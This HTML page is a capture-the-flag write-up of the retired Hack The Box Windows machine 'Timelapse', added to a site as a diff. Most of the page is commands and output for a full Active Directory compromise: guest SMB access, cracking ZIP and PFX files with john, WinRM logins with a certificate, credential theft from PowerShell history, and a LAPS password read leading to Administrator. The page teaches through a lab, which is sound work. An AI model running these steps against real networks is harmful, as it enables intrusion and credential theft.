@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Timelapse &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Timelapse</h1>
+    
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">SMB</span><span class="tag">PFX</span><span class="tag">john</span><span class="tag">pfx2john</span><span class="tag">WinRM</span><span class="tag">SSL</span><span class="tag">PowerShellHistory</span><span class="tag">LAPS</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#smb-enumeration">SMB Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#cracking-the-zip-and-pfx">Cracking the ZIP and PFX</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#powershell-history-svc-deploy">PowerShell History → svc_deploy</a><a class="lvl3" href="#laps-readers-administrator">LAPS_Readers → Administrator</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Timelapse is an easy Windows Active Directory box with no exploits anywhere. A guest-accessible SMB share contains a password-protected ZIP and a <code>.pfx</code> certificate file. Both crack with john. The certificate and private key extracted from the PFX authenticate to WinRM over SSL as <code>legacyy</code>. PowerShell command history in <code>legacyy</code>'s profile reveals credentials for <code>svc_deploy</code>, which is a member of the <code>LAPS_Readers</code> group. LAPS is queried for the DC's local administrator password, and that gives full access.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
+135/tcp  open  msrpc             Microsoft Windows RPC
+139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb)
+445/tcp  open  microsoft-ds?
+636/tcp  open  ldapssl?
+3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb)
+Service Info: Host: DC01; OS: Windows
+</code></pre>
+<p>Classic DC port profile. The domain is <code>timelapse.htb</code>.</p>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>null access yields little. The guest account can list shares, and one is non-standard:</p>
+<pre><code class="language-sh">smbclient //timelapse.htb/Shares -U 'guest'
+</code></pre>
+<p>The <code>Shares</code> share contains a password-protected ZIP (<code>winrm_backup.zip</code>) and a <code>.pfx</code> file (<code>legacyy_dev_auth.pfx</code>).</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="cracking-the-zip-and-pfx">Cracking the ZIP and PFX</h3>
+<p>Convert the ZIP to a john hash and crack it:</p>
+<pre><code class="language-sh">zip2john winrm_backup.zip &gt; hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+supremelegacy
+</code></pre>
+<p>The ZIP contents aren't the prize. The <code>.pfx</code> file inside the share is. Convert it to a john hash:</p>
+<pre><code class="language-sh">pfx2john legacyy_dev_auth.pfx &gt; hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+thuglegacy
+</code></pre>
+<blockquote>
+<p><strong>What a PFX file is:</strong> a <code>.pfx</code> (PKCS#12) file bundles a private key and one or more certificates into a single encrypted archive. It's commonly used to export a certificate with its key from a Windows certificate store. With the password, you can extract both components. Here, the certificate was used for WinRM client authentication, meaning you authenticate to the service by presenting this certificate rather than a username/password.</p>
+</blockquote>
+<p>Extract the private key and certificate:</p>
+<pre><code class="language-sh">openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
+openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
+</code></pre>
+<p>Connect to WinRM with certificate authentication (<code>-S</code> for SSL is required):</p>
+<pre><code class="language-sh">evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
+</code></pre>
+<p>Shell obtained as <code>legacyy</code>. User flag at <code>C:\Users\legacyy\Desktop\user.txt</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="powershell-history-svc-deploy">PowerShell History → svc_deploy</h3>
+<p>PowerShell saves command history to <code>%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>. Legacyy's history contains a credential assignment:</p>
+<pre><code class="language-powershell">$p = ConvertTo-SecureString '‹redacted›' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl ...
+</code></pre>
+<p>Credentials recovered:</p>
+<pre><code>svc_deploy : ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why PowerShell history leaks credentials:</strong> <code>PSReadLine</code> saves every command typed in an interactive session to a plaintext file, persistent across sessions. Commands that inline credentials, like <code>ConvertTo-SecureString 'password' -AsPlainText -Force</code>, are stored verbatim. This is one of the most productive files to check on Windows boxes.</p>
+</blockquote>
+<p>Log in as <code>svc_deploy</code>:</p>
+<pre><code class="language-sh">evil-winrm -i timelapse.htb -u svc_deploy -p '‹redacted›' -S
+</code></pre>
+<h3 id="laps-readers-administrator">LAPS_Readers → Administrator</h3>
+<p><code>svc_deploy</code> is a member of <code>TIMELAPSE\LAPS_Readers</code>. LAPS (Local Administrator Password Solution) has the DC managing local admin passwords for domain-joined computers. The <code>LAPS_Readers</code> group can read those passwords via the <code>ms-mcs-admpwd</code> AD attribute:</p>
+<pre><code class="language-powershell">Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+
+ms-mcs-admpwd : GI]K;&amp;&amp;l2$!6H-z68x(PicE7
+</code></pre>
+<blockquote>
+<p><strong>Why LAPS_Readers is significant:</strong> LAPS rotates local administrator passwords and stores them encrypted in Active Directory. Members of the designated reader group can query that attribute. If any of those accounts are compromised, you get the current local admin password for every LAPS-managed computer, which typically includes all Domain Controllers.</p>
+</blockquote>
+<p>Local administrator credentials:</p>
+<pre><code>administrator : GI]K;&amp;&amp;l2$!6H-z68x(PicE7
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">evil-winrm -i timelapse.htb -u administrator -p 'GI]K;&amp;&amp;l2$!6H-z68x(PicE7' -S
+</code></pre>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\users\TRX\desktop&gt; type root.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Guest SMB access is worth a thorough look.</strong> A non-default share with cryptographic material is a direct foothold path.</li>
+<li><strong>PFX files can substitute for password-based authentication.</strong> If a cert-auth endpoint is available and a PFX is crackable, it bypasses the need for a plaintext password entirely.</li>
+<li><strong>PSReadLine history is always worth reading.</strong> It persists across reboots and captures every interactive command, including inline credential assignments.</li>
+<li><strong>LAPS_Readers gives the rotating local admin password.</strong> One compromised LAPS reader account reads every managed machine's current admin password.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
